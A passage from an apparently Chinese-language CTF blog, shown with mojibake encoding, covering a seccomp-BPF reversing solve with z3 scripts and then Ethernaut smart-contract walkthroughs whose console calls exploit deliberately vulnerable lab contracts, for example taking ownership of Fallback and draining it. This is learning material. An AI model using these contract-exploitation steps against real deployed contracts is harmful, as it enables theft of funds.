class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%57s&quot;</span>, v4) == <span class="number">1</span></span><br><span class="line">    &amp;&amp; ~(<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)v4) + <span class="number">1</span>) == <span class="number">-59LL</span></span><br><span class="line">    &amp;&amp; !<span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)v4, <span class="string">&quot;irisctf&#123;&quot;</span>, <span class="number">8uLL</span>)</span><br><span class="line">    &amp;&amp; (_BYTE)v5 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    syscall(<span class="number">0x1337</span>LL, v4[<span class="number">1</span>], v4[<span class="number">2</span>], v4[<span class="number">3</span>], v4[<span class="number">4</span>], v4[<span class="number">5</span>], v4[<span class="number">6</span>]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Maybe? idk bro&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Guess harder&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¡®å®šäº†BPFåœ¨ç‰©ç†å†…å­˜ä¸­çš„ä½ç½®åå°±å¯ä»¥<strong>å…¨éƒ¨</strong>dumpå‡ºæ¥è¿›è¡Œåæ±‡ç¼–äº†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumper.py</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">excut</span>(<span class="params">prog</span>):</span><br><span class="line">    process = subprocess.Popen(prog, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    out, _ = process.communicate()</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x2060</span></span><br><span class="line">lenth = <span class="number">0x76a0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./chal&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(start)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        data = f.read(lenth)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;filter_%d&#x27;</span> % i, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> d:</span><br><span class="line">            d.write(data)</span><br><span class="line">        excut(<span class="string">f&#x27;sudo seccomp-tools disasm ./filter_<span class="subst">&#123;i&#125;</span> &gt; dump_<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        excut(<span class="string">f&#x27;rm ./filter_<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;dump_<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        data = data.replace(<span class="string">&#x27;sys_number&#x27;</span>, <span class="string">&#x27;0x1337&#x27;</span>).replace(<span class="string">&#x27;arch&#x27;</span>, <span class="string">&#x27;0xc000003e&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;dump_<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data.split(<span class="string">&#x27;=================================\n&#x27;</span>)[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>å°±èƒ½å¾—åˆ°8ä¸ªè¿™æ ·çš„dump-disasmæ–‡ä»¶:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F01%2F08%2F20250108-231049.png" alt="image-20250108231049146"></p>
<p>è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆ<code>arch</code>æ›¿æ¢æˆäº†0xc000003e ç¨‹åºçš„æ¡†æ¶æ˜¯ARCH_X86_64æ˜¯ç¡®å®šçš„ è€ŒBPFè¿‡æ»¤å™¨ä½¿ç”¨çš„æ˜¯<a href="https://tomoyo.sourceforge.net/cgi-bin/lxr/source/include/uapi/linux/audit.h?v=linux-5.7.19">include&#x2F;uapi&#x2F;linux&#x2F;audit.h</a>ä¸‹å®šä¹‰çš„æ¡†æ¶å®ä½œä¸ºæ¡†æ¶å¯¹åº”å€¼çš„ å…¶å®šä¹‰ä¸º:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EM_X86_64       62      <span class="comment">/* AMD x86-64 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __AUDIT_ARCH_64BIT 0x80000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __AUDIT_ARCH_LE    0x40000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AUDIT_ARCH_X86_64       (EM_X86_64|__AUDIT_ARCH_64BIT|__AUDIT_ARCH_LE)</span></span><br></pre></td></tr></table></figure>

<p>æ˜¾ç„¶è¦ç”¨z3æ¥è§£ çœ‹å®˜æ–¹é¢˜è§£è‡ªå·±å®ç°äº†ä¸€ä¸ªæ¨¡æ‹Ÿå™¨æ¥æ‰§è¡Œ å®é™…ä¸Šè¿™äº›åæ±‡ç¼–å·²ç»ç¬¦åˆpythonè¯­æ³• è®°å½•ä¸€ä¸‹å¯èƒ½å‡ºç°çš„æŒ‡ä»¤æ ·å¼ç›´æ¥ç”¨<code>exec()</code>æ¥æ‰§è¡Œå³å¯:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">A = <span class="number">0</span></span><br><span class="line">X = <span class="number">0</span></span><br><span class="line">mask = <span class="number">0xFFFFFFFF</span></span><br><span class="line">mem  = [<span class="number">0</span>] * <span class="number">0x10</span></span><br><span class="line"><span class="comment"># args = [BitVec(f&#x27;arg_&#123;i&#125;&#x27;, 64) for i in range(6)]</span></span><br><span class="line">args = [BitVec(<span class="string">f&#x27;arg_<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span> * <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># vars = &#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;dump_<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            code = line[<span class="number">34</span>:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> code[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> <span class="keyword">or</span> code[<span class="number">0</span>] == <span class="string">&#x27;X&#x27;</span> <span class="keyword">or</span> code[<span class="number">0</span>] == <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;args&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> code:</span><br><span class="line">                    <span class="built_in">exec</span>(code)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(A) == <span class="built_in">int</span>:</span><br><span class="line">                        A &amp;= mask</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(X) == <span class="built_in">int</span>:</span><br><span class="line">                        X &amp;= mask</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = re.<span class="keyword">match</span>(<span class="string">r&#x27;A = args\[(\d+)\]&#x27;</span>, code)</span><br><span class="line">                    idx = res.group(<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">if</span> code[-<span class="number">5</span>:] == <span class="string">&#x27;&gt;&gt; 32&#x27;</span>:</span><br><span class="line">                        A = args[<span class="built_in">int</span>(idx) * <span class="number">2</span> + <span class="number">1</span>]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        A = args[<span class="built_in">int</span>(idx) * <span class="number">2</span>]</span><br><span class="line">            <span class="keyword">elif</span> code[<span class="number">0</span>] == <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">                res = re.<span class="keyword">match</span>(<span class="string">r&#x27;if \(A != (\d+)\) goto (\d+)&#x27;</span>, code)</span><br><span class="line">                num = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> res:</span><br><span class="line">                    num = <span class="built_in">int</span>(res.group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        res = re.<span class="keyword">match</span>(<span class="string">r&#x27;if \(A == (\d+)\) goto (\d+)&#x27;</span>, code)</span><br><span class="line">                        num = <span class="built_in">int</span>(res.group(<span class="number">1</span>))</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                s.add(A == num)</span><br><span class="line">            <span class="comment"># vars[code[0]] = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(vars)</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span> * <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(m[args[i]].as_long().to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>).decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span> * <span class="number">4</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­varsç”¨æ¥æ¢æµ‹å¯èƒ½å‡ºç°çš„æŒ‡ä»¤æ ·å¼ å‘ç°åªå¯èƒ½å‡ºç°<code>A</code>æˆ–<code>X</code>æˆ–<code>m(mem[i] = ...)</code>å¼€å¤´çš„è¿ç®—ç±»æ“ä½œ, <code>i(if(A ...)</code>çš„è·³è½¬æ“ä½œä»¥åŠ<code>r(return ...)</code>è¿”å›æ“ä½œ å…¶ä¸­è¿ç®—æ“ä½œå¯ä»¥ç›´æ¥æ‰§è¡Œ è·³è½¬æ“ä½œéœ€è¦æ·»åŠ ç´¯åŠ å™¨Aä¸­çš„å€¼å’Œç›®æ ‡å€¼ç›¸ç­‰çš„çº¦æŸ è¿”å›æ“ä½œåœ¨è¾“å…¥æ­£ç¡®æ—¶ä¸å¯èƒ½è§¦å‘æ‰€ä»¥ç›´æ¥è·³è¿‡</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>BPF</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»é›¶å¼€å§‹çš„é€†å‘æ‰‹å…¥é—¨Web3ç”Ÿæ´»</title>
    <url>/2025/02/05/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E9%80%86%E5%90%91%E6%89%8B%E5%85%A5%E9%97%A8Web3%E7%94%9F%E6%B4%BB/</url>
    <content><![CDATA[<p>ä¸€è§‰é†’æ¥å¤§å®¶éƒ½åœ¨å’Œé€†å‘åˆ‡å‰²! é‚£æˆ‘è‚¯å®šä¸èƒ½è½åå•Š</p>
<span id="more"></span>

<h2 id="æ²¡æœ‰ä¸»ç½‘ä½™é¢è¦æ±‚çš„sepoliaæ°´é¾™å¤´"><a href="#æ²¡æœ‰ä¸»ç½‘ä½™é¢è¦æ±‚çš„sepoliaæ°´é¾™å¤´" class="headerlink" title="æ²¡æœ‰ä¸»ç½‘ä½™é¢è¦æ±‚çš„sepoliaæ°´é¾™å¤´"></a>æ²¡æœ‰ä¸»ç½‘ä½™é¢è¦æ±‚çš„sepoliaæ°´é¾™å¤´</h2><p><a href="https://cloud.google.com/application/web3/faucet/ethereum/sepolia">Google Cloud Web3</a> æ¯å¤©0.05eth</p>
<p><a href="https://console.optimism.io/faucet">Superchain Faucet</a> æ¯å¤©0.1eth</p>
<h2 id="èŠå£«åŒº"><a href="#èŠå£«åŒº" class="headerlink" title="èŠå£«åŒº"></a>èŠå£«åŒº</h2><p>åŸºç¡€æ¦‚å¿µä¸Š<a href="https://solidity-by-example.org/">Solidity by Example</a>çœ‹è·Ÿç€å®è·µå°±è¡Œ ä½†æ˜¯æ„Ÿè§‰å¦‚æœæ˜¯é›¶åŸºç¡€å…¥é—¨çš„è¯ç›´æ¥å—¯çœ‹å®Œå†å»åšé¢˜å¤§ä¼¤å­¦ä¹ åŠ¨åŠ› æœ€å¥½æ˜¯ç›´æ¥åšä¸€äº›æ™ºèƒ½åˆçº¦æ¼æ´çš„é¢˜ é‡åˆ°ä¸ä¼šçš„å†æ¥æŸ¥ è¦å…ˆçœ‹çš„è¯å°±ç›´æ¥çœ‹å…¶ä¸­æ„Ÿè§‰æ¯”è¾ƒé‡è¦çš„å‡ ç« :</p>
<p><a href="https://solidity-by-example.org/variables">Variables</a></p>
<p><a href="https://solidity-by-example.org/data-locations">Data Locations - Storage, Memory and Calldata</a></p>
<p><a href="https://solidity-by-example.org/view-and-pure-functions">View and Pure Functions</a></p>
<p><a href="https://solidity-by-example.org/function-modifier">Function Modifier</a></p>
<p><a href="https://solidity-by-example.org/sending-ether">Sending Ether (transfer, send, call)</a></p>
<h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><h4 id="åˆçº¦ä¸€äº›å¸¸ç”¨çš„å¸¸é‡"><a href="#åˆçº¦ä¸€äº›å¸¸ç”¨çš„å¸¸é‡" class="headerlink" title="åˆçº¦ä¸€äº›å¸¸ç”¨çš„å¸¸é‡"></a>åˆçº¦ä¸€äº›å¸¸ç”¨çš„å¸¸é‡</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msg.&#123;</span><br><span class="line">    sender	: å‘æ™ºèƒ½åˆçº¦å‘èµ·äº¤æ˜“çš„è´¦å· åœ¨éƒ¨ç½²åˆçº¦æ—¶ sender æŒ‡çš„æ˜¯éƒ¨ç½²åˆçº¦çš„å¤–éƒ¨è´¦å·,</span><br><span class="line">    value	: å‘æ™ºèƒ½åˆçº¦å‘èµ·äº¤æ˜“æ—¶ä¼ é€’çš„èµ„é‡‘å€¼,</span><br><span class="line">    data	: å‚¨å­˜äº†è°ƒç”¨åˆçº¦æ—¶äº¤æ˜“æ•°æ®çš„åŸå§‹å­—èŠ‚æ•°ç»„,</span><br><span class="line">    gas		: å½“å‰äº¤æ˜“å¯ç”¨çš„ gas æ•°é‡,</span><br><span class="line">    sig		: äº¤æ˜“è°ƒç”¨çš„å‡½æ•°ç­¾å</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ethernautåšé¢˜è®°å½•"><a href="#Ethernautåšé¢˜è®°å½•" class="headerlink" title="Ethernautåšé¢˜è®°å½•"></a>Ethernautåšé¢˜è®°å½•</h2><h3 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h3><p>è¿™å…³å°±æ˜¯è®©ç”¨æˆ·ç†Ÿæ‚‰ä¸€ä¸‹Ethernautçš„ä¸€äº›åŠŸèƒ½çš„ Ethernautæä¾›äº†ç›´æ¥åœ¨ç½‘é¡µçš„jsæ§åˆ¶å°ä¸é¢˜ç›®è¿›è¡Œäº¤äº’çš„ABI è°ƒç”¨<code>help()</code>å¯ä»¥çœ‹åˆ°å‡ ä¸ªå¸¸ç”¨çš„å® åŒ…æ‹¬è½¬è´¦å’Œé‡‘é¢å•ä½è½¬æ¢ åŒæ—¶è¿˜è‡ªå¸¦jsçš„web3åº“ å¯ä»¥è°ƒç”¨å„ç§API</p>
<p>é€šè¿‡<code>contract.MethodName()</code>æ¥è°ƒç”¨åˆçº¦ä¸­çš„å‡½æ•°</p>
<p>æœ¬é¢˜çš„åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line">    string public password;</span><br><span class="line">    uint8 public infoNum = 42;</span><br><span class="line">    string public theMethodName = &quot;The method name is method7123949.&quot;;</span><br><span class="line">    bool private cleared = false;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;You will find what you need in info1().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info1() public pure returns (string memory) &#123;</span><br><span class="line">        return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&quot;hello&quot;))) &#123;</span><br><span class="line">            return &quot;The property infoNum holds the number of the next info method to call.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Wrong parameter.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info42() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;theMethodName is the name of the next method.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;If you know the password, submit it to authenticate().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate(string memory passkey) public &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">            cleared = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCleared() public view returns (bool) &#123;</span><br><span class="line">        return cleared;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªè¦ç›´æ¥è·å–<code>password</code>çš„å€¼ç„¶åè°ƒç”¨<code>authenticate()</code>å°±èƒ½é€šå…³äº†</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">password</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">authenticate</span>(pw)</span><br></pre></td></tr></table></figure>

<h3 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h3><p>è¿™å…³ä¸»è¦æ˜¯è®©æˆ‘ä»¬äº†è§£åˆçº¦æ¥æ”¶æ•°å­—è´§å¸çš„ä¸€äº›ç‰¹æ€§ å½“ä¸€ä¸ªåˆçº¦æ¥æ”¶åˆ°ä¸€å®šé‡‘é¢æ—¶ ä¼šæ ¹æ®ä»¥ä¸‹è¿‡ç¨‹åˆ¤æ–­è°ƒç”¨å“ªä¸ªå‡½æ•°:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F05%2F20250205-141048.png" alt="image-20250205141030022"></p>
<p>æœ¬é¢˜åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆçº¦ä¸­çš„<code>owner</code>è¢«è®¾ç½®æˆäº†éƒ¨ç½²è‡ªå·±çš„å¤–éƒ¨è´¦æˆ· é€šå…³æ¡ä»¶æ˜¯å°†<code>owner</code>è®¾ç½®æˆ<code>player</code>å¹¶è°ƒç”¨<code>withdraw()</code>æŠŠåˆçº¦é‡Œçš„å¸æèµ° å¯ä»¥çœ‹åˆ°<code>receive()</code>å‡½æ•°ä¸­å°±æœ‰ä¿®æ”¹<code>owner</code>çš„é€»è¾‘ æ ¹æ®ä¸Šé¢åˆ¤æ–­è°ƒç”¨å“ªä¸ªå‡½æ•°çš„è¿‡ç¨‹ æˆ‘ä»¬éœ€è¦ç›´æ¥å‘åˆçº¦è½¬è´¦ æ­¤å¤–æˆ‘ä»¬è¿˜éœ€è¦å…ˆè°ƒç”¨<code>contribute()</code>å¹¶åœ¨äº¤æ˜“ä¸­é™„å¸¦ä¸€ä¸ªå°äº0.001ethçš„é‡‘é¢æ¥è®©<code>contributions[player]</code>ä¸å¤§äº0</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&#x27;0.0001&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)&#125;);</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>:player, <span class="attr">to</span>:instance, <span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&#x27;0.0001&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)&#125;);</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>();</span><br></pre></td></tr></table></figure>

<h3 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h3><p>è¿™é¢˜ç›®çš„æ˜¯è®©æˆ‘ä»¬æ³¨æ„å®¡è®¡ä»£ç </p>
<p>é¢˜ç›®åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡åˆçº¦ä¼šå‘ç°æ³¨é‡Šæ˜¯æ„é€ å‡½æ•°çš„å…¶å®æ˜¯ä¸€ä¸ªæ™®é€šçš„å‡½æ•°(å‡½æ•°åå’Œåˆçº¦åä¸ä¸€è‡´) æ‰€ä»¥ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°å°±èƒ½pwnæ‰è¿™ä¸ªåˆçº¦äº†</p>
<h3 id="Coin-flip"><a href="#Coin-flip" class="headerlink" title="Coin flip"></a>Coin flip</h3><p>è¿™é¢˜ä¸»è¦æ˜¯æ•™æˆ‘ä»¬è‡ªå·±å†™åˆçº¦æ¥è§£é¢˜</p>
<p>é¢˜ç›®åˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä¼ªéšæœºç”ŸæˆæŠ›ç¡¬å¸çš„ç»“æœæ¥è®©æˆ‘ä»¬çŒœ è¿ç»­çŒœä¸­10æ¬¡å°±èƒ½é€šå…³ è¿™é‡Œä¸ºäº†æ¨¡ä»¿ä¼ªéšæœºæ•°çš„ç”Ÿæˆæˆ‘ä»¬å†™ä¸€ä¸ªåˆçº¦:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 